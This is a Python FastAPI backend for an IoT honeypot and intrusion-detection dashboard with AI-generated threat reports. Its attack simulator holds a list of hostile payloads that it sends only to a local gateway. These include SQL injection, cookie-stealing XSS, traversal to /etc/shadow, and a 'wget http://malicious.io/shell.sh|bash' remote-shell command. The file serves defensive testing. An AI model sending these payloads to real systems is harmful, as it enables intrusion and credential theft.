from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
import pandas as pd
import os
import subprocess
import requests
import time
import json
import asyncio
import paramiko
from datetime import datetime
import random
import sys
sys.path.insert(0, os.path.dirname(__file__))
import honeypot_analyser as ha


app = FastAPI()
templates = Jinja2Templates(directory="dashboard/templates")

CSV_PATH = "logs/traffic_labeled.csv"
LOGS_PATH = "logs/ai_logs.json"
METRICS_PATH = "logs/ai_metrics.json"
HONEYPOT_REPORT_PATH = "logs/honeypot_report.json"

REQUEST_ID = 0

AI_ANALYSIS_LOG = "logs/ai_analysis.log"

def load_ai_analysis():
    if not os.path.exists(AI_ANALYSIS_LOG):
        return []

    records = []
    try:
        with open(AI_ANALYSIS_LOG, "r") as f:
            for line in f:
                try:
                    records.append(json.loads(line.strip()))
                except:
                    continue
    except Exception as e:
        print(f"[AI_ANALYSIS] Error: {e}")
        return []

    return records[-200:]  # last 200 entries

def load_data():
    if not os.path.exists(CSV_PATH):
        return pd.DataFrame(columns=[
            "src_ip", "dst_ip", "protocol",
            "packet_size", "timestamp", "label"
        ])
    return pd.read_csv(CSV_PATH)

def load_logs():
    """Load AI processing logs"""
    if not os.path.exists(LOGS_PATH):
        return []
    try:
        with open(LOGS_PATH, 'r') as f:
            return json.load(f)
    except:
        return []

def load_metrics():
    """Load latest AI model metrics"""
    if not os.path.exists(METRICS_PATH):
        return None
    try:
        with open(METRICS_PATH, 'r') as f:
            return json.load(f)
    except:
        return None

@app.get("/", response_class=HTMLResponse)
def dashboard(request: Request):
    return templates.TemplateResponse(
        "dashboard.html",
        {"request": request}
    )
 
@app.get("/stats")
def stats():
    df = load_data()

    total_packets = len(df)
    normal = int((df["label"] == 0).sum()) if not df.empty else 0
    suspicious = int((df["label"] == 1).sum()) if not df.empty else 0

    device_hits = (
        df["dst_ip"].value_counts().to_dict()
        if not df.empty else {}
    )

    # Fixed: Use timestamp column and create time buckets
    timeline = {}
    if not df.empty and "timestamp" in df.columns:
        try:
            # Convert timestamp to datetime if it's not already
            df['timestamp'] = pd.to_datetime(df['timestamp'])
            # Group by hour or by count index
            timeline = (
                df.groupby(df.index // 10)  # Group every 10 packets
                  .size()
                  .to_dict()
            )
        except:
            # Fallback: just use packet index
            timeline = {i: 1 for i in range(min(len(df), 20))}

    return {
        "total_packets": total_packets,
        "normal": normal,
        "suspicious": suspicious,
        "benign": normal,  # Added for compatibility
        "malicious": suspicious,  # Added for compatibility
        "device_hits": device_hits,
        "timeline": timeline
    }

@app.get("/logs")
def get_logs():
    """Get AI processing logs"""
    return {"logs": load_logs()}

@app.get("/metrics")
def get_metrics():
    """Get AI model performance metrics"""
    metrics = load_metrics()
    if metrics is None:
        return {"status": "no_data"}
    return metrics

@app.get("/export")
def export_dataset():
    return {
        "message": "Dataset ready",
        "path": CSV_PATH
    }

@app.get("/devices", response_class=HTMLResponse)
def devices(request: Request):
    device_info = {
        "real_devices": 5,
        "honeypot_devices": 3,
        "dummy_devices": 2
    }

    return templates.TemplateResponse(
        "devices.html",
        {
            "request": request,
            "devices": device_info
        }
    )

@app.get("/control", response_class=HTMLResponse)
def control_page(request: Request):
    return templates.TemplateResponse(
        "control.html",
        {"request": request}
    )

@app.get("/ai-monitor", response_class=HTMLResponse)
def ai_monitor(request: Request):
    return templates.TemplateResponse(
        "ai_monitor.html",
        {"request": request}
    )

@app.post("/control/inject")
def inject_traffic():
    try:
        subprocess.run(
            ["python3", "dashboard/traffic_injector.py"],
            check=True,
            capture_output=True,
            text=True
        )
        return {"status": "ok"}
    except subprocess.CalledProcessError as e:
        return {
            "status": "error",
            "stdout": e.stdout,
            "stderr": e.stderr
        }
        
@app.post("/control/analyze")
def run_ai():
    try:
        subprocess.run(
            ["python3", "ai_engine/hybrid_ai.py"],
            check=True,
            timeout=60
        )
        return {"status": "AI analysis complete", "success": True}
    except subprocess.TimeoutExpired:
        return {"status": "AI analysis timed out", "success": False}
    except Exception as e:
        return {"status": f"Error: {str(e)}", "success": False}

@app.get("/gateway_logs")
def gateway_logs():
    log_path = "logs/gateway.log"

    if not os.path.exists(log_path):
        return {"logs": []}

    entries = []
    try:
        with open(log_path, "r") as f:
            for line in f:
                try:
                    entries.append(json.loads(line.strip()))
                except:
                    continue
    except Exception as e:
        print(f"Error reading gateway logs: {e}")
        return {"logs": []}

    return {"logs": entries[-200:]}  

@app.get("/gateway", response_class=HTMLResponse)
def gateway_page(request: Request):
    return templates.TemplateResponse(
        "gateway.html",
        {"request": request}
    )

@app.get("/ai_analysis")
def ai_analysis():
    return {"records": load_ai_analysis()}


# ── Attack Simulation Endpoint ─────────────────────────────────────────────
import random as _random

ATTACK_PATTERNS = [
    # (path, method, body, attack_type, description)
    ("/admin/login",          "POST", "username=admin&password=admin123",           "brute_force",       "Admin login brute-force"),
    ("/admin/login",          "POST", "username=root&password=toor",                "brute_force",       "Root credential stuffing"),
    ("/wp-login.php",         "POST", "log=admin&pwd=password&wp-submit=Log+In",    "cve_probe",         "WordPress login attack"),
    ("/.env",                 "GET",  "",                                            "cve_probe",         "Environment file probe"),
    ("/.git/config",          "GET",  "",                                            "cve_probe",         "Git config exposure"),
    ("/phpmyadmin/",          "GET",  "",                                            "cve_probe",         "phpMyAdmin probe"),
    ("/api/v1/../../etc/passwd","GET","",                                            "path_traversal",    "Path traversal attack"),
    ("/cgi-bin/../etc/shadow", "GET", "",                                            "path_traversal",    "CGI path traversal"),
    ("/search?q=1' OR '1'='1","GET",  "",                                            "sqli",              "SQL injection probe"),
    ("/user?id=1 UNION SELECT * FROM users--","GET","",                             "sqli",              "UNION-based SQLi"),
    ("/comment",              "POST", "msg=<script>alert(document.cookie)</script>", "xss",               "Stored XSS attempt"),
    ("/api/ping",             "POST", "host=127.0.0.1; cat /etc/passwd",            "rce",               "Command injection"),
    ("/api/update",           "POST", "cmd=wget http://malicious.io/shell.sh|bash", "rce",               "Remote shell injection"),
    ("/firmware/update",      "POST", "file=../../../../etc/crontab",               "path_traversal",    "Firmware path traversal"),
    ("/status",               "GET",  "",                                            "recon",             "Device recon probe"),
    ("/device/info",          "GET",  "",                                            "recon",             "IoT device enumeration"),
    ("/xmlrpc.php",           "POST", "<methodCall><methodName>system.listMethods</methodName></methodCall>", "cve_probe", "XML-RPC enumeration"),
]

# Realistic attacker IPs
ATTACKER_IPS = [
    "45.33.32.156", "185.220.101.47", "192.168.99.254",
    "10.10.10.200",  "172.16.200.5",   "198.51.100.42",
    "203.0.113.99",  "91.108.4.1",     "185.130.5.231",
]

@app.post("/control/simulate_attack")
async def simulate_attack(request: Request):
    """
    Simulate a randomised attack request against the gateway.
    Picks a random attack pattern and attacker IP each time —
    nothing is hardcoded per invocation.
    """
    import requests as _req

    pattern   = _random.choice(ATTACK_PATTERNS)
    path, method, body, atype, desc = pattern
    src_ip    = _random.choice(ATTACKER_IPS)
    gateway   = "http://127.0.0.1:8080"

    # Vary the path slightly to avoid identical repeated requests
    if "{" not in path:
        suffixes = ["", "?debug=1", "?v=" + str(_random.randint(1,99)),
                    "?lang=en", "&id=" + str(_random.randint(1,9999))]
        path += _random.choice(suffixes)

    headers = {
        "X-Forwarded-For":  src_ip,
        "X-Real-IP":        src_ip,
        "X-Force-Suspicious": "1",  # demo override - guarantees honeypot routing, see gateway.py
        "User-Agent":       _random.choice([
            "Mozilla/5.0 (compatible; Googlebot/2.1)",
            "sqlmap/1.7.8#stable",
            "Nikto/2.1.6",
            "curl/7.68.0",
            "python-requests/2.28.0",
            "masscan/1.3.2",
            "zgrab/0.x",
        ]),
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        if method == "GET":
            r = _req.get(gateway + path, headers=headers, timeout=250)
        else:
            r = _req.post(gateway + path, data=body, headers=headers, timeout=250)

        return {
            "status":        "ok",
            "attack_type":   atype,
            "description":   desc,
            "path":          path,
            "method":        method,
            "body":          body,
            "src_ip":        src_ip,
            "http_status":   r.status_code,
            "response_body": r.text,
        }
    except Exception as e:
        return {
            "status":      "error",
            "attack_type": atype,
            "description": desc,
            "path":        path,
            "method":      method,
            "src_ip":      src_ip,
            "error":       str(e),
        }


# ── SSH Terminal Bridge — browser xterm.js <-> Beelzebub SSH honeypot ──────
# Connects to the LLM-driven SSH decoy (ssh-2222.yaml), not a real device.
# Credentials below are the honeypot's own fake login, not a real secret.
SSH_HONEYPOT_HOST = "127.0.0.1"
SSH_HONEYPOT_PORT = 5022          # honeypot_c1's mapped host port for :2222
SSH_HONEYPOT_USER = "admin"
SSH_HONEYPOT_PASS = "admin123"    # must match passwordRegex in ssh-2222.yaml

@app.get("/ssh-terminal", response_class=HTMLResponse)
def ssh_terminal_page(request: Request):
    return templates.TemplateResponse("ssh_terminal.html", {"request": request})

@app.websocket("/ws/ssh-terminal")
async def ssh_terminal_ws(websocket: WebSocket):
    await websocket.accept()

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            SSH_HONEYPOT_HOST, port=SSH_HONEYPOT_PORT,
            username=SSH_HONEYPOT_USER, password=SSH_HONEYPOT_PASS,
            look_for_keys=False, allow_agent=False, timeout=10,
        )
    except Exception as e:
        await websocket.send_text(f"\r\n[connection failed: {e}]\r\n")
        await websocket.close()
        return

    channel = client.invoke_shell(term="xterm")
    channel.settimeout(0.0)  # non-blocking reads, polled below

    state = {"closed": False}

    async def pump_ssh_to_ws():
        while not state["closed"]:
            try:
                if channel.recv_ready():
                    data = channel.recv(4096)
                    if not data:
                        break
                    await websocket.send_text(data.decode(errors="replace"))
                else:
                    await asyncio.sleep(0.05)
            except Exception:
                break
        state["closed"] = True

    reader_task = asyncio.create_task(pump_ssh_to_ws())

    try:
        while True:
            data = await websocket.receive_text()
            channel.send(data)
    except (WebSocketDisconnect, Exception):
        pass
    finally:
        state["closed"] = True
        reader_task.cancel()
        try:
            channel.close()
            client.close()
        except Exception:
            pass

@app.get("/honeypot/report")
def get_honeypot_report():
    if not os.path.exists(HONEYPOT_REPORT_PATH):
        return {"status": "no_report", "sessions": [], "total_sessions": 0}
    try:
        with open(HONEYPOT_REPORT_PATH) as f:
            return json.load(f)
    except Exception as e:
        return {"status": "error", "message": str(e)}
 
 
@app.post("/honeypot/generate_report/{req_id}")
def generate_report(req_id: str):
    """
    1. Find the record with matching req_id in ai_analysis.log
    2. Send it to Ollama (llama3:8b) for deep analysis
    3. Save result to logs/honeypot_report.json
    4. Return the result
    """
    # ── Step 1: find the record ──────────────────────────────
    record = None
    if os.path.exists(AI_ANALYSIS_LOG):
        with open(AI_ANALYSIS_LOG) as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    obj = json.loads(line)
                    if str(obj.get("req_id", "")) == str(req_id):
                        record = obj
                        break
                except Exception:
                    continue
 
    if not record:
        return {"error": f"No record found for req_id {req_id}"}
 
    # ── Step 2: build a richer prompt using the full record ──
    analysis = record.get("analysis", {})
    flow     = record.get("flow", {})
    hp       = record.get("honeypot_engagement", {})
 
    alert_id = f"IDS-{str(record.get('timestamp',''))[:10].replace('-','')}-{str(record.get('req_id',''))[-6:]}"
 
    existing = record.get('analysis', {})
    why_list = existing.get('why_suspicious', [])
    baseline = existing.get('benign_baseline_comparison', '')
    hyp      = existing.get('attack_hypothesis', existing.get('attack_type', 'unknown'))
    prior    = flow.get('prior_suspicious_count', 0)
    src_ip   = record.get('src_ip', '?')
    dst_port = str(flow.get('dst_port', '?'))
    src_port = str(flow.get('src_port', '?'))
    conn     = flow.get('conn_state', '?')
    pkts     = flow.get('packet_count', '?')
    ts       = record.get('timestamp', '')
 
    # Keep the prompt concise — llama3:8b works better with focused prompts
    prompt = f"""You are a cybersecurity analyst. Write a formal threat report for this IoT honeypot alert.
Return ONLY a JSON object, no other text.
 
ALERT:
- req_id: {record.get('req_id')}
- timestamp: {ts}
- src_ip: {src_ip}, src_port: {src_port}
- dst_port: {dst_port}, conn_state: {conn}, packets: {pkts}
- initial_classification: {hyp}
- initial_threat_level: {existing.get('threat_level', 'unknown')}
- initial_confidence: {existing.get('confidence', 0)}
- why_flagged: {'; '.join(why_list)}
- baseline_note: {baseline}
- prior_suspicious_from_this_ip: {prior}
- honeypot_engaged: {hp.get('source','?')} status={hp.get('status','?')}
 
Return this JSON (fill EVERY field — no nulls, no dashes):
{{
  "alert_id": "{alert_id}",
  "threat_level": "HIGH",
  "attack_type": "write the specific attack name e.g. SQL Injection, CVE Probe, Path Traversal",
  "confidence": 80,
  "status": "INVESTIGATING",
  "summary": "Write 2-3 sentences describing what happened, what was targeted, and the risk to this IoT device.",
  "attacker_intent": "One sentence: what the attacker was trying to achieve.",
  "key_findings": [
    "Describe the specific request/payload observed",
    "Describe source IP behaviour and {prior} prior suspicious requests",
    "Describe connection pattern: {conn} state, {pkts} packets",
    "Describe what the honeypot returned to the attacker",
    "Describe deviation from normal IoT traffic on port {dst_port}"
  ],
  "why_suspicious": {json.dumps(why_list) if why_list else '["Anomalous request pattern", "Deviates from IoT baseline", "Matches known attack signature"]'},
  "benign_baseline_comparison": "Write: how does normal traffic on port {dst_port} from IoT devices differ from this request?",
  "attack_hypothesis": "Write the specific technique or CVE e.g. OWASP A03:2021 Injection, T1190, CVE probe",
  "severity_reasoning": "Write one sentence explaining why this is the chosen threat level based on the evidence.",
  "recommended_action": "Step 1: specific action -> Step 2: specific action -> Step 3: specific action",
  "ioc": {{
    "src_ip": "{src_ip}",
    "src_port": "{src_port}",
    "dst_port": "{dst_port}",
    "protocol": "TCP",
    "conn_state": "{conn}",
    "packet_count": "{pkts}"
  }}
}}"""
 
    try:
        resp = requests.post(
            "http://127.0.0.1:11434/api/chat",
            json={
                "model": "llama3:8b",
                "messages": [{"role": "user", "content": prompt}],
                "stream": False,
                "options": {"temperature": 0.1},
            },
            timeout=300,  # 5 minutes — llama3:8b can be slow under memory pressure
        )
        resp.raise_for_status()
        raw = resp.json()["message"]["content"].strip()
        print(f"[OLLAMA RAW] {raw[:400]}")
        import re as _re
        content = _re.sub(r"^```(?:json)?\s*", "", raw)
        content = _re.sub(r"\s*```$", "", content)
        j0 = content.find('{')
        j1 = content.rfind('}')
        if j0 != -1 and j1 != -1:
            content = content[j0:j1+1]
        deep_analysis = json.loads(content)
        print(f"[OLLAMA KEYS] {list(deep_analysis.keys())}")
    except Exception as e:
        print(f"[OLLAMA FAIL] {type(e).__name__}: {e}")
        # Build a useful report from the data we already have, even without Ollama
        deep_analysis = {
            "alert_id":                  alert_id,
            "threat_level":              (existing.get("threat_level") or "MEDIUM").upper(),
            "attack_type":               hyp or "Unknown",
            "confidence":                existing.get("confidence", 0),
            "status":                    "INVESTIGATING",
            "summary":                   (f"Suspicious traffic detected from {src_ip} targeting port {dst_port}. "
                                          f"The request was flagged as {hyp} with {prior} prior suspicious "
                                          f"requests from this source. Honeypot engagement confirmed."),
            "attacker_intent":           f"Attempting {hyp} against IoT gateway on port {dst_port}.",
            "key_findings":              why_list or ["Anomalous request pattern detected", "Deviates from IoT baseline"],
            "why_suspicious":            why_list or [],
            "benign_baseline_comparison": baseline or "Request deviates from normal IoT traffic patterns.",
            "attack_hypothesis":         hyp or "Unknown attack vector",
            "severity_reasoning":        f"Classified as {existing.get('threat_level','MEDIUM')} based on initial gateway AI assessment with {existing.get('confidence',0)}% confidence.",
            "recommended_action":        existing.get("recommended_action", f"Block {src_ip} -> Review logs -> Monitor port {dst_port}"),
            "ioc": {
                "src_ip":       src_ip,
                "src_port":     src_port,
                "dst_port":     dst_port,
                "protocol":     "TCP",
                "conn_state":   conn,
                "packet_count": str(pkts)
            },
            "error":  f"Ollama timeout — report generated from existing analysis data. ({type(e).__name__})",
            "source": "fallback_existing"
        }
 
    # ── Post-process: fill any missing fields from the raw record ──────
    # So the report never shows "—" for data we already have
    if 'ioc' not in deep_analysis or not deep_analysis.get('ioc'):
        deep_analysis['ioc'] = {
            'src_ip': src_ip, 'src_port': src_port,
            'dst_port': dst_port, 'protocol': 'TCP',
            'conn_state': conn, 'packet_count': str(pkts)
        }
    else:
        ioc = deep_analysis['ioc']
        ioc.setdefault('src_ip',       src_ip)
        ioc.setdefault('src_port',     src_port)
        ioc.setdefault('dst_port',     dst_port)
        ioc.setdefault('conn_state',   conn)
        ioc.setdefault('packet_count', str(pkts))
 
    if not deep_analysis.get('alert_id'):
        deep_analysis['alert_id'] = alert_id
    if not deep_analysis.get('why_suspicious') and why_list:
        deep_analysis['why_suspicious'] = why_list
    if not deep_analysis.get('benign_baseline_comparison') and baseline:
        deep_analysis['benign_baseline_comparison'] = baseline
    if not deep_analysis.get('attack_type') and hyp:
        deep_analysis['attack_type'] = hyp
    if not deep_analysis.get('summary') and deep_analysis.get('attacker_intent'):
        deep_analysis['summary'] = deep_analysis['attacker_intent']
    if not deep_analysis.get('key_findings') and why_list:
        deep_analysis['key_findings'] = why_list
 
    
 
 
    # ── Step 3: save to report ───────────────────────────────
    result = {
        "record":      record,
        "analysis":    deep_analysis,
        "analysed_at": str(__import__('datetime').datetime.utcnow()),
    }
 
    report = {"generated_at": None, "total_sessions": 0, "sessions": []}
    if os.path.exists(HONEYPOT_REPORT_PATH):
        try:
            with open(HONEYPOT_REPORT_PATH) as f:
                report = json.load(f)
        except Exception:
            pass
 
    existing_ids = [str(s.get("record", {}).get("req_id", "")) for s in report["sessions"]]
    if str(req_id) in existing_ids:
        idx = existing_ids.index(str(req_id))
        report["sessions"][idx] = result
    else:
        report["sessions"].append(result)
 
    report["total_sessions"] = len(report["sessions"])
    report["generated_at"]   = str(__import__('datetime').datetime.utcnow())
 
    with open(HONEYPOT_REPORT_PATH, "w") as f:
        json.dump(report, f, indent=2)
 
    return result

